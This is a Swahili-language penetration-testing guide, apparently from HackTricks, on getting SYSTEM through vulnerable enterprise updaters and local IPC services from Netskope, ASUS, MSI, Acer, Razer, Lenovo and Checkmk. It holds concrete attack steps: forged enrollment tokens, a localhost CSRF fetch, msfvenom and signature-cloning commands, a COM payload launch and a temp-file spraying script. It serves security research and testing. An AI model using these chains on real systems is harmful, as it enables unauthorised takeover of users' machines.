# Kutumia Vibaya Enterprise Auto-Updaters na Privileged IPC (k.m., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unaeleza kwa ujumla aina ya minyororo ya Windows local privilege escalation inayopatikana katika enterprise endpoint agents na updaters zinazotoa IPC surface inayoweza kufikiwa kwa urahisi na mtiririko wa update wenye privileges za juu. Mfano unaowakilisha aina hii ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji asiye na privileges za juu anaweza kulazimisha enrollment itumie server inayodhibitiwa na mshambuliaji, kisha kuwasilisha MSI hasidi ambayo service ya SYSTEM husakinisha.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Mawazo muhimu unayoweza kutumia tena dhidi ya bidhaa zinazofanana:
- Tumia vibaya localhost IPC ya service yenye privileges za juu ili kulazimisha enrollment upya au kubadilisha usanidi uelekezwe kwenye server ya mshambuliaji.
- Tekeleza update endpoints za vendor, wasilisha Trusted Root CA hasidi, na uelekeze updater kwenye package hasidi “iliyotiwa saini”.
- Epuka ukaguzi dhaifu wa signer (orodha za kuruhusu za CN), digest flags za hiari na MSI properties zisizo na vizuizi vya kutosha.
- Ikiwa IPC “imesimbwa kwa njia fiche”, pata key/IV kutoka kwa machine identifiers zinazosomwa na kila mtu na kuhifadhiwa kwenye registry.
- Ikiwa service inazuia callers kulingana na image path/process name, ingiza code kwenye process iliyo kwenye orodha ya kuruhusiwa au ianzishe ikiwa suspended kisha uanzishe DLL yako kupitia marekebisho madogo ya thread context.

Custom local TCP services zinahitaji ukaguzi sawa wa utambulisho na mipaka ya ingizo, hata zinapohitaji PIN au credential nyingine ya programu. Tambua listener inahusishwa na process gani na effective service account yake, kisha kagua binary/version halisi iliyosakinishwa na kama fields zinazodhibitiwa na caller hukaguliwa urefu wake kabla ya kunakiliwa kwenye fixed buffers au kutumiwa kuunda amri ya child-process. [Mwongozo wa Microsoft kuhusu buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) unaeleza kwa nini ingizo la nje lisilokaguliwa ni hatari katika native code yenye privileges za juu. Listener ya loopback, credential iliyowekwa moja kwa moja kwenye code, au process name pekee havithibitishi memory corruption au utekelezaji wa SYSTEM; reachability, authorization, code path na mitigations ni masharti tofauti. Fanya enumeration ya kawaida bila kutuma ingizo refu kiasi cha kusababisha crash kwenye service inayotumika.

---
## 1) Kulazimisha enrollment iende kwenye server ya mshambuliaji kupitia localhost IPC

Agents nyingi huja na user-mode UI process inayowasiliana na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Iliyoonekana kwenye Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Mtiririko wa exploit:
1) Tengeneza JWT enrollment token ambayo claims zake zinadhibiti backend host (k.m., AddonUrl). Tumia alg=None ili saini isihitajike.
2) Tuma ujumbe wa IPC unaoita provisioning command pamoja na JWT na jina la tenant yako:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Huduma huanza kutuma maombi kwa seva yako potovu ili kupata enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Vidokezo:
- Ikiwa uthibitishaji wa caller unategemea path/name, anzisha ombi kutoka kwa allow-listed vendor binary (tazama §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC ya usimamizi inayofikiwa kupitia mtandao

Mpaka huu wa uaminifu hauishii kwenye localhost kila wakati. Katika kisa kilichoripotiwa cha MyReport Updater 2.1.1, huduma ya `LocalSystem` ilikuwa inasikiliza kwenye interfaces zote na kukubali mabadiliko ya configuration ya gRPC yasiyohitaji uthibitishaji, kwa ajili ya reference host, port na operating mode. Kwa variant ya remote, ufikiaji wa mtandao kwa listener na ufikiaji wa huduma kwenye mtandao wa kutoka kwenda kwenye reference iliyochaguliwa vilihitajika. Tathmini haya kando na suala la kama mtiririko wa baadaye wa package unaweza kuvuka mpaka wa file-write.<sup>[[16]](#references)</sup>

---
## 2) Kuteka nyara update channel ili kuendesha code kama SYSTEM

Mara client inapoanza kuwasiliana na seva yako, tekeleza endpoints zinazotarajiwa na ielekeze kwenye MSI ya mshambuliaji. Mfuatano wa kawaida:

1) /v2/config/org/clientconfig → Rudisha configuration ya JSON yenye muda mfupi sana wa updater interval, kwa mfano:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Hurejesha cheti cha CA katika umbizo la PEM. Huduma hukisakinisha kwenye hifadhi ya Trusted Root ya Local Machine.
3) /v2/checkupdate → Toa metadata zinazoelekeza kwenye MSI hasidi na toleo bandia.

Kukwepa ukaguzi wa kawaida unaoonekana mara nyingi:
- Orodha ya kuruhusu ya Signer CN: huduma inaweza kuangalia tu kama Subject CN ni sawa na “netSkope Inc” au “Netskope, Inc.”. CA yako ghushi inaweza kutoa cheti cha leaf chenye CN hiyo na kusaini MSI.
- Sifa ya CERT_DIGEST: jumuisha sifa isiyo hasidi ya MSI inayoitwa CERT_DIGEST. Hakuna utekelezaji wa ukaguzi wakati wa usakinishaji.
- Utekelezaji wa hiari wa ukaguzi wa digest: bendera ya config (kwa mfano, check_msi_digest=false) huzima uthibitishaji wa ziada wa kriptografia.

Matokeo: huduma ya SYSTEM husakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
na kutekeleza code yoyote kama NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Somo la kukwepa viraka: ikiwa vendor atajibu kwa kuruhusu orodha fupi ya domain “zinazoaminika” badala ya kuthibitisha kwa kriptografia chanzo cha update, tafuta redirector au reverse proxy zinazomilikiwa na vendor ambazo bado zinakuruhusu kuelekeza trafiki. Katika kesi ya Netskope, utafiti wa umma uliofuata ulionyesha kuwa orodha ya kuruhusu ya enzi ya R129 bado ingeweza kutumiwa vibaya kupitia `rproxy.goskope.com`, ambayo ilipitisha maudhui ya Azure App Service yaliyodhibitiwa na mshambuliaji. Chukulia orodha za hostname zinazoruhusiwa kama kikwazo kidogo tu, si kama mpaka wa uaminifu.<sup>[[14]](#references)</sup>

Aina nyingine ya hitilafu ni **metadata ya package inayolingana yenyewe lakini haijathibitishwa**. Katika kesi ya MyReport, rejeleo lililodhibitiwa na mshambuliaji lilitoa archive iliyorekebishwa huku mpatanishi akibadilisha majibu ya MD5 digest na ukubwa ya vendor kabla hayajamfikia updater. Kulinganisha thamani hizo kulikagua uthabiti wa majibu, si asili ya vendor; hakukuwa na haja ya MD5 collision. Kisha, saraka ya usakinishaji iliyochaguliwa na mtumiaji iliifanya extraction yenye mamlaka ya juu kuwa mpaka wa kuandika faili. Primitive ya kupakia DLL iliyotokana na hili imeelezwa chini ya [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Kutengeneza maombi ya IPC yaliyosimbwa kwa njia fiche (yanapokuwepo)

Kuanzia R127, Netskope ilifunga JSON ya IPC ndani ya sehemu ya encryptData inayoonekana kama Base64. Reverse engineering ilionyesha AES yenye key/IV zinazotokana na thamani za registry ambazo mtumiaji yeyote anaweza kusoma:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Washambuliaji wanaweza kurudia usimbaji fiche na kutuma amri halali zilizofichwa kwa usimbaji fiche kutoka kwa mtumiaji wa kawaida.<sup>[[1]](#references)[[2]](#references)</sup> Kidokezo cha jumla: ikiwa agent itaanza ghafla “kusimba kwa njia fiche” IPC yake, tafuta device ID, product GUID, na install ID chini ya HKLM kama nyenzo zinazotumika.

---
## 4) Kukwepa orodha za IPC zinazoruhusu wapigaji (ukaguzi wa njia/jina)

Baadhi ya huduma hujaribu kuthibitisha peer kwa kupata PID ya muunganisho wa TCP na kulinganisha njia/jina la image na binary za vendor zilizo kwenye orodha ya kuruhusiwa na zilizoko chini ya Program Files (kwa mfano, stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo za kukwepa:
- DLL injection ndani ya process iliyo kwenye orodha ya kuruhusiwa (kwa mfano, nsdiag.exe) kisha kupeleka IPC kupitia proxy kutoka ndani yake.
- Anzisha binary iliyo kwenye orodha ya kuruhusiwa ikiwa imesimamishwa na uanzishe proxy DLL yako bila CreateRemoteThread (tazama §5) ili kutimiza sheria za kuzuia uchezewaji zinazotekelezwa na driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection inayozingatia ulinzi dhidi ya uchezewaji: process iliyosimamishwa + kiraka cha NtContinue

Mara nyingi bidhaa hujumuisha driver ya minifilter/OB callbacks (kwa mfano, Stadrv) ili kuondoa haki hatari kutoka kwa handles za process zinazolindwa:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: huzuia hadi THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader ya user-mode inayotegemewa na inayozingatia vikwazo hivi:
1) Tekeleza CreateProcess ya binary ya vendor kwa kutumia CREATE_SUSPENDED.
2) Pata handles ambazo bado unaruhusiwa kutumia: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na handle ya thread yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME pekee ikiwa unaweka kiraka kwenye code kwenye RIP inayojulikana).
3) Andika juu ya ntdll!NtContinue (au thunk nyingine ya mapema iliyohakikishwa kuwa imepakiwa) kwa stub ndogo inayoita LoadLibraryW kwenye njia ya DLL yako, kisha inaruka kurudi.
4) Tumia ResumeThread kuendesha stub yako ndani ya process na kupakia DLL yako.

Kwa kuwa hukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye process ambayo tayari inalindwa (uliianzisha wewe mwenyewe), sera ya driver inatimizwa.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Zana za vitendo
- NachoVPN (plugin ya Netskope) hujiendeshea uundaji wa CA ghushi, usainishaji wa MSI hasidi, na hutoa endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ni mteja maalum wa IPC anayetengeneza ujumbe holela wa IPC (unaoweza kufichwa kwa usimbaji fiche wa AES) na hujumuisha injection ya process iliyosimamishwa ili kutuma maombi kutoka kwa binary iliyo kwenye orodha ya kuruhusiwa.<sup>[[4]](#references)</sup>

## 7) Mtiririko wa haraka wa uchunguzi wa awali kwa updater/IPC zisizojulikana

Unapokutana na endpoint agent mpya au suite ya “helper” ya motherboard, mtiririko wa haraka kwa kawaida hutosha kujua kama unakagua lengo linalofaa la privesc:<sup>[[6]](#references)</sup>

1) Orodhesha wasikilizaji wa loopback na ulinganishe na process za vendor zinazohusiana nao:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Orodhesha named pipes zinazowezekana:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Kusanya data za uelekezaji zinazotegemea registry zinazotumiwa na seva za IPC zinazotegemea plugin:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Toa majina ya endpoint, keys za JSON, na command IDs kutoka kwa client ya user-mode kwanza. Frontend za Electron/.NET zilizopakiwa mara nyingi hufichua schema nzima:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Tafuta sharti halisi la uaminifu, si njia ya msimbo inayoishia kuzindua mchakato tu:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Mifumo inayofaa kuipa kipaumbele:
- `CryptQueryObject`/uchanganuzi wa certificate bila `WinVerifyTrust` kwa kawaida humaanisha kuwa “certificate ipo” ilichukuliwa kuwa “certificate inaaminika”, jambo linalowezesha cloning ya certificate au mbinu nyingine za kutumia signer bandia.
- Ukaguzi wa substring/suffix kwenye `Origin`, `Referer`, URL za upakuaji, majina ya process, au CN za signer si uthibitishaji. `contains(".vendor.com")` kwa kawaida inaweza kudhulumiwa kwa kutumia domain zinazofanana zinazodhibitiwa na attacker.
- Ikiwa GUI yenye privilege ndogo ndiyo inayoamua “file inaaminika” na SYSTEM broker inatumia tu matokeo hayo, kuweka patch au kutekeleza upya DLL/JS ya upande wa client mara nyingi hupita kabisa mpaka huo (mgawanyo wa uthibitishaji wa mtindo wa Razer).
- Ikiwa broker inanakili payload hadi `%TEMP%`/`C:\Windows\Temp` kisha kuithibitisha au kuipangia kazi kutoka hapo, jaribu mara moja mianya ya TOCTOU ya kubadilisha faili na module za plugin zilizo jirani zinazotoa wrappers mbadala za `ExecuteTask()` zenye ukaguzi dhaifu zaidi.<sup>[[6]](#references)</sup>

Kwa targets zinazotumia sana named pipes, PipeViewer ni njia ya haraka ya kuona DACL dhaifu na pipes zinazoweza kufikiwa kwa mbali kabla hujaanza kureverse protocol kwa kina.<sup>[[11]](#references)</sup>

Ikiwa target inathibitisha callers kwa kutumia PID, image path, au jina la process pekee, ichukulie hiyo kama kikwazo kidogo badala ya mpaka wa usalama: kuingiza code kwenye client halali, au kuanzisha connection kutoka kwa process iliyo kwenye allow-list, mara nyingi kunatosha kutimiza ukaguzi wa server. Kwa named pipes hasa, [ukurasa huu kuhusu client impersonation na matumizi mabaya ya pipe](named-pipe-client-impersonation.md) unaeleza primitive hiyo kwa kina zaidi.

Kwa **cleanup au restore broker** yenye privilege, kagua mpaka wa uaminifu wa path pamoja na pipe ACL. Caller mwenye privilege ndogo anaweza kuchagua restore destination au kubadilisha jina la backup artifact iliyowekwa kwenye directory inayoshirikiwa, hata kama service executable na install directory yake zinalindwa. Thibitisha kila moja kando: caller anaweza kufikia restore command; anaweza kurekebisha input au filename husika iliyowekwa; broker inaendeshwa chini ya identity yenye privilege zaidi; na restore operation yake inaandika kweli kwenye protected path iliyochaguliwa. Directory ya staging inayoweza kuandikwa au pipe inayoweza kusomeka pekee haithibitishi uwezekano wa arbitrary privileged write; uhusishaji wa destination na tabia ya service vinahitaji code review au majaribio yaliyodhibitiwa. Usitumie cleanup command usiyoijua wakati wa passive enumeration kwa sababu inaweza kufuta mafaili ya mtumiaji.

---
## 8) Modular add-in brokers zinazothibitisha kwa vendor signatures pekee (muundo wa Lenovo Vantage)

Tofauti mpya inayostahili kutafutwa ni **signed-client RPC broker**: process ya desktop ya Lenovo yenye saini, iliyo na privilege ndogo, huwasiliana na SYSTEM service, na service hiyo huelekeza JSON commands kwenye seti ya add-ins zilizoelezwa kwenye XML chini ya `%ProgramData%`. Mara tu code execution inapopatikana **ndani ya client yoyote yenye saini inayokubaliwa**, kila contract ya `runas="system"` inakuwa sehemu ya attack surface yako.<sup>[[15]](#references)</sup>

Primitive zenye thamani kubwa zilizoonekana kwenye utafiti wa Lenovo Vantage:
- **Kuamini caller kwa sababu imesainiwa na vendor**: watafiti walipata authenticated context kwa kunakili EXE iliyosainiwa na Lenovo hadi directory inayoweza kuandikwa na kufanikisha DLL side-load (`profapi.dll`) ili code holela iendeshwe ndani ya client ambayo service tayari iliiamini.
- **Ugunduzi wa attack surface unaoongozwa na manifest**: add-ins hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; contracts kadhaa huendeshwa kama `SYSTEM`, kwa hiyo kuorodhesha manifests hizo mara nyingi hufichua verbs halisi zenye privilege haraka kuliko kureverse broker yenyewe.
- **Bugs za kila command ndani ya channel iliyothibitishwa**: mara tu ukiwa ndani ya client inayoaminika, utafiti wa umma ulibaini path-traversal pamoja na race conditions kwenye update/install verbs, matumizi mabaya ya raw-SQL kwenye privileged settings databases, na ukaguzi wa registry path unaotegemea substring uliowezesha writes nje ya hive iliyokusudiwa.

Recon inayofaa kwenye target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Mambo ya kuzingatia kwa vitendo: kila suite ya helper inapofichua broker ambayo kwanza huthibitisha **caller process** na kisha tu kusambaza maombi kwa makumi ya amri za plugin/add-in, usiishie baada ya kupita ukaguzi wa uaminifu wa mwanzo. Dump jedwali la manifest/contract na fuzz kila verb yenye privileges za juu kivyake; channel iliyothibitishwa kwa kawaida huficha bugs kadhaa za hatua ya pili.

---
## 1) CSRF kutoka browser kwenda localhost dhidi ya HTTP API zenye privileges za juu (ASUS DriverHub)

DriverHub huja na HTTP service ya user-mode (ADU.exe) kwenye 127.0.0.1:53000 inayotarajia maombi ya browser kutoka https://driverhub.asus.com. Kichujio cha origin hutumia tu `string_contains(".asus.com")` kwenye kichwa cha Origin na kwenye URL za upakuaji zinazofichuliwa na `/asus/v1.0/*`. Kwa hiyo, host yoyote inayodhibitiwa na attacker, kama vile `https://driverhub.asus.com.attacker.tld`, hupita ukaguzi na inaweza kutuma maombi yanayobadilisha hali kupitia JavaScript.<sup>[[6]](#references)</sup> Tazama [misingi ya CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifumo mingine ya kupita ukaguzi.

Mtiririko wa vitendo:
1) Sajili domain yenye `.asus.com` ndani yake na uhost ukurasa wa wavuti hasidi hapo.
2) Tumia `fetch` au XHR kuita endpoint yenye privileges za juu (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – JS ya frontend iliyopakiwa inaonyesha schema hapa chini.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Hata PowerShell CLI iliyoonyeshwa hapa chini hufanikiwa wakati header ya Origin inapoghushiwa ili iwe na thamani inayoaminika:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Ziara yoyote ya kivinjari kwenye tovuti ya mshambulizi kwa hiyo huwa CSRF ya ndani inayohitaji kubofya mara moja (au mara 0 kupitia `onload`) na kuendesha helper ya SYSTEM.

---
## 2) Uthibitishaji usio salama wa code-signing na cloning ya cheti (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` hupakua executable zozote zilizobainishwa kwenye JSON body na kuzihifadhi kwenye cache ya `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitishaji wa URL ya upakuaji hutumia tena mantiki ileile ya kulinganisha substring, kwa hiyo `http://updates.asus.com.attacker.tld:8000/payload.exe` inakubaliwa. Baada ya kupakua, ADU.exe hukagua tu kwamba PE ina signature na kwamba mfuatano wa Subject unalingana na ASUS kabla ya kuiendesha — hakuna `WinVerifyTrust`, wala uthibitishaji wa chain.

Ili kutumia udhaifu huu:
1) Unda payload (kwa mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Nakili signer wa ASUS ndani yake (kwa mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` kwenye domain inayofanana na `.asus.com` na uanzishe UpdateApp kupitia CSRF ya kivinjari iliyoelezwa hapo juu.

Kwa kuwa vichujio vya Origin na URL hutegemea substring, na ukaguzi wa signer hulinganisha mfuatano pekee, DriverHub hupakua na kutekeleza binary ya mshambulizi katika muktadha wake wenye ruhusa za juu.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU kwenye njia za kunakili/kutekeleza za updater (MSI Center CMD_AutoUpdateSDK)

Huduma ya MSI Center ya SYSTEM hutoa TCP protocol ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Component kuu (Component ID `0f 27 00 00`) inasambaza `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa kwenye `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (subject ya cheti lazima ilingane na “MICRO-STAR INTERNATIONAL CO., LTD.” na `WinVerifyTrust` ifanikiwe).
3) Huunda scheduled task inayoendesha faili ya temp kama SYSTEM kwa kutumia arguments zinazodhibitiwa na mshambulizi.

Faili iliyonakiliwa haifungwi kati ya uthibitishaji na `ExecuteTask()`. Mshambulizi anaweza:
- Kutuma Frame A inayoelekeza kwenye binary halali iliyosainiwa na MSI (kuhakikisha ukaguzi wa signature unafaulu na task inawekwa kwenye foleni).
- Kuishindania kwa kutuma mara kwa mara ujumbe wa Frame B unaoelekeza kwenye payload hasidi, na kuandika juu ya `MSI Center SDK.exe` mara tu baada ya uthibitishaji kukamilika.

Scheduler inapowasha, huendesha payload iliyoandikwa juu ya faili chini ya SYSTEM, licha ya kuwa ilithibitisha faili ya awali. Udukuzi unaotegemeka hutumia goroutines/threads mbili zinazotuma CMD_AutoUpdateSDK mfululizo hadi dirisha la TOCTOU lishindwe.<sup>[[6]](#references)</sup>

---
## 2) Kutumia vibaya IPC maalum za kiwango cha SYSTEM na impersonation (MSI Center + Acer Control Centre)

### Seti za amri za MSI Center TCP
- Kila plugin/DLL inayopakiwa na `MSI.CentralServer.exe` hupokea Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Baiti 4 za kwanza za frame huchagua component hiyo, hivyo washambuliaji wanaweza kuelekeza amri kwenye modules zozote.
- Plugins zinaweza kufafanua task runners zao. `Support\API_Support.dll` hutoa `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na huita moja kwa moja `API_Support.EX_Task::ExecuteTask()` bila uthibitishaji wa signature — mtumiaji yeyote wa ndani anaweza kuielekeza kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata utekelezaji wa SYSTEM kwa uhakika.
- Kunasa loopback kwa Wireshark au kuchunguza binaries za .NET kupitia dnSpy hufichua haraka uhusiano kati ya Component na amri; kisha clients maalum za Go/Python zinaweza kutuma tena frames.<sup>[[6]](#references)</sup>

### Named pipes za Acer Control Centre na viwango vya impersonation
- `ACCSvc.exe` (SYSTEM) hutoa `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake inaruhusu clients za mbali (kwa mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na njia ya faili huanzisha utaratibu wa huduma wa kuanzisha process.
- Client library huserialise baiti ya terminator ya kipekee (113) pamoja na args. Uchunguzi wa wakati wa utekelezaji kwa Frida/`TsDotNetLib` (tazama [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa vidokezo vya instrumentation) unaonyesha kwamba handler ya native huweka thamani hii kwenye `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) na 114 (`0x72`) hupeleka utekelezaji kwenye branch ya jumla inayohifadhi tokeni kamili ya SYSTEM na kuweka high-integrity SID (`S-1-16-12288`). Kwa hiyo, binary iliyoanzishwa huendeshwa kama SYSTEM bila vizuizi, ndani ya mashine na kati ya mashine.
- Changanya hili na flag ya installer iliyo wazi (`Setup.exe -nocheck`) ili kusanidi ACC hata kwenye lab VMs na kujaribu pipe bila vifaa vya mtengenezaji.<sup>[[6]](#references)</sup>

Hitilafu hizi za IPC zinaonyesha kwa nini huduma za localhost lazima zitekeleze uthibitishaji wa pande zote (ALPC SIDs, vichujio vya `ImpersonationLevel=Impersonation`, uchujaji wa tokeni), na kwa nini helper ya kila module ya “kuendesha binary yoyote” lazima itumie uthibitishaji uleule wa signer.

---
## 3) Helpers za COM/IPC “elevator” zinazotegemea uthibitishaji dhaifu wa user-mode (Razer Synapse 4)

Razer Synapse 4 iliongeza muundo mwingine muhimu katika kundi hili: mtumiaji mwenye ruhusa za chini anaweza kuiomba COM helper ianzishe process kupitia `RzUtility.Elevator`, huku uamuzi wa uaminifu ukifanywa na DLL ya user-mode (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya eneo lenye ruhusa za juu.

Njia ya udukuzi iliyoonekana:
- Unda instance ya COM object `RzUtility.Elevator`.
- Ita `LaunchProcessNoWait(<path>, "", 1)` ili kuomba uzinduzi wenye ruhusa za juu.
- Kwenye PoC ya umma, kizuizi cha PE-signature ndani ya `simple_service.dll` huondolewa kwa patch kabla ya kutuma ombi, na hivyo kuruhusu executable yoyote iliyochaguliwa na mshambulizi kuzinduliwa.<sup>[[6]](#references)[[10]](#references)</sup>

Utekelezaji mdogo wa PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Hitimisho la jumla: unapochunguza kwa reverse engineering suite za “helper”, usiishie kwenye localhost TCP au named pipes. Kagua kama kuna COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha kama service yenye privileged inathibitisha binary lengwa yenyewe au inaamini tu matokeo yaliyokokotolewa na client DLL ya user-mode inayoweza kurekebishwa. Muundo huu hauishii kwa Razer: muundo wowote uliogawanywa ambapo broker yenye high-privilege hutumia uamuzi wa allow/deny kutoka upande wa low-privilege ni eneo linaloweza kuwa privesc.

---
## Utekelezaji wa script ya muda inayotabirika wakati wa MSI repair (Checkmk Agent / CVE-2024-0670)

Baadhi ya Windows agents bado hutekeleza vitendo vyenye privileged kwa kuandika `.cmd` ya muda kwenye `C:\Windows\Temp` na kuiendesha kama `SYSTEM`. Ikiwa jina la faili linatabirika na service haiundi upya faili zilizopo kwa usalama, user mwenye low-privilege anaweza kuunda mapema faili ya muda inayotarajiwa na kuiweka **read-only**, na hivyo kulazimisha process yenye privileged kutekeleza maudhui yanayodhibitiwa na mshambulizi badala ya script yake yenyewe.

Imeonekana katika builds zilizo hatarini za Checkmk Agent:
- muundo wa temp: `cmk_all_<PID>_1.cmd`
- branches zilizoathirika: `2.0.0`, `2.1.0`, `2.2.0`
- kichocheo: **repair** ya kifurushi cha agent kilichohifadhiwa kwenye cache ya MSI<sup>[[8]](#references)[[9]](#references)</sup>

Mtiririko wa kazi kwa vitendo:
1. Kadiria wigo halisi wa PID kutoka kwa process IDs za sasa au PID ya agent inayoendeshwa.
2. Andika payload fupi ya `.cmd` ya **ASCII** (`Set-Content -Encoding Ascii` au uelekeze matokeo kupitia `cmd.exe`; epuka matokeo ya PowerShell ya UTF-16 kwa batch files).
3. Sambaza `C:\Windows\Temp\cmk_all_<PID>_1.cmd` katika wigo lengwa na uweke kila faili kuwa read-only.
4. Anzisha repair ya MSI iliyohifadhiwa kwenye cache ili service yenye privileged ijaribu kuunda upya, kisha itekeleze script ya muda.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ikiwa bidhaa iliyo hatarini imesakinishwa kwa kutumia Windows Installer, tambua jina la bidhaa linalolingana na MSI yenye jina linaloonekana kama la nasibu iliyohifadhiwa kwenye `C:\Windows\Installer` kabla ya kuanzisha urekebishaji:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Maelezo ya kiutendaji:
- `qwinsta` ni muhimu wakati `msiexec /fa` inashindwa kutoka kwenye WinRM shell isiyoingiliana, na unahitaji kujua kama session iliyopo ya desktop/iliyokatika inaweza kuanzisha repair ipasavyo.<sup>[[7]](#references)</sup>
- Muundo huu unatumika pia kwa endpoint agents na updaters wengine wanaoweka scripts za muda katika maeneo yanayoweza kuandikiwa na kila mtu, kisha kuzitekeleza kama SYSTEM. Jaribu majina yanayotabirika, ukosefu wa semantiki za uundaji wa kipekee, na mitiririko ya repair/update inayoweza kuanzishwa inapohitajika.

### Repair ya installer inayoingiliana na console yenye haki za juu

